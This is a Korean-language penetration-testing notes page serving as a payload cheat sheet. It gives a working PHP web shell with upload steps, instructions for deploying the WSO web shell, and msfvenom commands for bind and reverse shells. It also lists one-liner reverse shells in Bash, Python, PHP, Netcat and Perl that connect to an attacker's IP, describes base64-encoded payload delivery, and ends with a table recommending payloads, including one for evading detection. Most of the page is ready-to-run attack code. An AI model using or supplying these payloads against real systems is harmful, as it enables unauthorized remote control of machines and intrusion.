---
sidebar_position: 5
title: Payloads
---

# 페이로드

## 개념

**페이로드**: 익스플로잇으로 전달되어 최종적으로 공격자가 원하는 작업을 수행하는 코드/데이터

### 페이로드 종류

- **바인드 쉘 (Bind Shell)**
- **리버스 쉘 (Reverse Shell)**
- **웹 쉘 (Web Shell)**
- **쉘코드 (Shellcode)**: 어셈블리 기반 기계어 코드
- **C2 에이전트**: Command and Control 콜백 에이전트
- **PIC (Position Independent Code)**: 위치 독립 코드

## 웹 쉘

### 기본 PHP 웹 쉘

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

### 업로드 및 사용

```bash
# 웹 쉘 업로드
scp webshell.php user@<target>:/var/www/html/

# 웹 브라우저로 접속
http://<target>/webshell.php?cmd=id

# URL 인코딩 예시
http://<target>/webshell.php?cmd=ls%20-alh

# cURL 사용
curl "http://<target>/webshell.php?cmd=ls%20-alh"
```

### 비밀번호 보호 웹 쉘

```bash
# WSO 웹 쉘 다운로드
wget https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/master/wso.php

# 비밀번호 MD5 해시 생성
echo -n 'mypassword' | md5sum

# wso.php 7번째 줄 수정
# $auth_pass = "<MD5 해시>";

# 랜덤 파일명으로 변경
mv wso.php abc123xyz-shell.php
```

## 바인드 쉘

### Msfvenom을 사용한 생성

```bash
# Linux 바인드 쉘
msfvenom -p linux/x64/shell_bind_tcp \
  RHOST=<target-ip> LPORT=<port> -f elf -o bindshell

# 파일 전송
scp bindshell user@<target>:/tmp/

# 대상에서 실행
chmod +x bindshell
./bindshell

# 공격자에서 접속
nc <target-ip> <port>
```

### 명령어 기반 바인드 쉘

```bash
# Netcat
rm -f /tmp/f; mkfifo /tmp/f; \
cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 9999 > /tmp/f
```

## 리버스 쉘

### Msfvenom을 사용한 생성

```bash
# Linux 리버스 쉘
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=<your-ip> LPORT=<port> -f elf -o reverse.elf

# Windows 리버스 쉘
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=<your-ip> LPORT=<port> -f exe -o reverse.exe

# 파일 전송
scp reverse.elf user@<target>:/tmp/

# 리스너 시작 (공격자)
nc -lvnp <port>

# 대상에서 실행
chmod +x reverse.elf
./reverse.elf
```

### 명령어 기반 리버스 쉘

#### Bash
```bash
sh -i >& /dev/tcp/<your-ip>/<port> 0>&1
```

#### Python
```bash
export RHOST="<your-ip>"; export RPORT=<port>; \
python3 -c 'import sys,socket,os,pty;s=socket.socket(); \
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT")))); \
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

#### PHP
```bash
php -r '$sock=fsockopen("<your-ip>",<port>); \
shell_exec("sh <&3 >&3 2>&3");'
```

#### Netcat
```bash
rm /tmp/f; mkfifo /tmp/f; \
cat /tmp/f | sh -i 2>&1 | nc <your-ip> <port> > /tmp/f
```

#### Perl
```bash
perl -e 'use Socket;$i="<your-ip>";$p=<port>; \
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); \
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S"); \
open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```

## Base64 인코딩 페이로드

파일 전송이 불가능한 경우:

```bash
# 페이로드 생성
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=<your-ip> LPORT=<port> -f elf -o shell.elf

# Base64 인코딩
cat shell.elf | base64 -w 0 > shell.b64

# 대상 시스템에서 디코딩 및 실행
echo '<base64_string>' | base64 -d > shell.elf; \
chmod +x shell.elf; ./shell.elf
```

## 리버스 쉘 리소스

### RevShells.com
자동으로 다양한 리버스 쉘 생성:
- https://www.revshells.com/

### PayloadsAllTheThings
다양한 페이로드 모음:
- https://github.com/swisskyrepo/PayloadsAllTheThings

## 주요 명령어 요약

```bash
# 웹 쉘
curl "http://<target>/shell.php?cmd=id"

# 바인드 쉘 생성
msfvenom -p linux/x64/shell_bind_tcp RHOST=<ip> LPORT=<port> -f elf -o bind

# 리버스 쉘 생성
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o rev

# 리스너
nc -lvnp <port>

# Bash 리버스 쉘
sh -i >& /dev/tcp/<ip>/<port> 0>&1

# Python 리버스 쉘
python3 -c 'import socket,subprocess,os; \
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \
s.connect(("<ip>",<port>));os.dup2(s.fileno(),0); \
os.dup2(s.fileno(),1);os.dup2(s.fileno(),2); \
subprocess.call(["/bin/sh","-i"])'

# Base64 인코딩
cat file | base64 -w 0
```

## 페이로드 선택 가이드

| 상황 | 권장 페이로드 |
|------|--------------|
| 웹 서버 접근 | 웹 쉘 |
| 방화벽 있음 (아웃바운드 허용) | 리버스 쉘 |
| 방화벽 있음 (인바운드 허용) | 바인드 쉘 |
| 파일 업로드 불가 | 명령어 기반 페이로드 |
| 안정적인 쉘 필요 | Msfvenom ELF/EXE |
| 탐지 회피 필요 | Base64 인코딩 + 난독화 |
